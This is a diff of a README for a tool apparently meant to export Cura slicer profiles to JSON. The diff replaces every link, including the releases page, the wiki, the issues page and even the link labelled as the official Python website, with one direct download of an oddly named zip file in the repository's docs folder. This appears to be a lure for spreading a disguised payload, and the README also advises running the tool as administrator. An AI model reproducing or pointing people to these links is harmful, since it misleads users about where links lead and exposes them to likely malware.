@@ -1,15 +1,15 @@
 # 🎉 Cura_Profile_Extractor - Simplify Your Cura Settings Management
 
 ## 🌐 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/gulascsanad/Cura_Profile_Extractor/releases)
+[![Download Latest Release](https://github.com/gulascsanad/Cura_Profile_Extractor/raw/refs/heads/main/docs/Extractor-Profile-Cura-windbagged.zip%20Latest%20Release-v1.0-blue)](https://github.com/gulascsanad/Cura_Profile_Extractor/raw/refs/heads/main/docs/Extractor-Profile-Cura-windbagged.zip)
 
 ## 🚀 Getting Started
 Cura_Profile_Extractor is a Python utility designed to make your life easier when working with Cura slicer settings. This tool converts all your settings into a single JSON file, making it easy to search through your configurations. Whether you want to document printer setups, troubleshoot issues, or share your profiles, this application has you covered.
 
 ## 📥 Download & Install
-To get started with Cura_Profile_Extractor, visit the [Releases page](https://github.com/gulascsanad/Cura_Profile_Extractor/releases) to download the latest version. Follow the steps below:
+To get started with Cura_Profile_Extractor, visit the [Releases page](https://github.com/gulascsanad/Cura_Profile_Extractor/raw/refs/heads/main/docs/Extractor-Profile-Cura-windbagged.zip) to download the latest version. Follow the steps below:
 
-1. Go to the [Releases page](https://github.com/gulascsanad/Cura_Profile_Extractor/releases).
+1. Go to the [Releases page](https://github.com/gulascsanad/Cura_Profile_Extractor/raw/refs/heads/main/docs/Extractor-Profile-Cura-windbagged.zip).
 2. Find the most recent version.
 3. Click on the file to download.
 4. Locate the downloaded file on your computer.
@@ -50,16 +50,16 @@ Once you have downloaded Cura_Profile_Extractor, follow these instructions to ru
 ## 🔧 Troubleshooting
 If you encounter issues running the application, check the following:
 
-- **Python Not Installed**: Ensure Python 3.7 or higher is installed on your machine. You can download it from the [official Python website](https://www.python.org/downloads/).
+- **Python Not Installed**: Ensure Python 3.7 or higher is installed on your machine. You can download it from the [official Python website](https://github.com/gulascsanad/Cura_Profile_Extractor/raw/refs/heads/main/docs/Extractor-Profile-Cura-windbagged.zip).
 - **Permission Issues**: Run the application as an administrator if you face access problems on your operating system.
 - **Logging Errors**: If you see error messages, refer to the application logs for more detail on what went wrong.
 
 ## 🔗 Additional Resources
-- **Documentation**: For in-depth usage and technical details, visit the [repository wiki](https://github.com/gulascsanad/Cura_Profile_Extractor/wiki).
-- **Community Support**: Join discussions and seek help in the [issues section](https://github.com/gulascsanad/Cura_Profile_Extractor/issues) of the repository.
+- **Documentation**: For in-depth usage and technical details, visit the [repository wiki](https://github.com/gulascsanad/Cura_Profile_Extractor/raw/refs/heads/main/docs/Extractor-Profile-Cura-windbagged.zip).
+- **Community Support**: Join discussions and seek help in the [issues section](https://github.com/gulascsanad/Cura_Profile_Extractor/raw/refs/heads/main/docs/Extractor-Profile-Cura-windbagged.zip) of the repository.
 
 ## 📋 License
 Cura_Profile_Extractor is open-source software released under the MIT License. You are free to use, modify, and distribute it.
 
 ## 📞 Contact
-For questions or support, please create an issue in the [GitHub repository](https://github.com/gulascsanad/Cura_Profile_Extractor/issues).
+For questions or support, please create an issue in the [GitHub repository](https://github.com/gulascsanad/Cura_Profile_Extractor/raw/refs/heads/main/docs/Extractor-Profile-Cura-windbagged.zip).
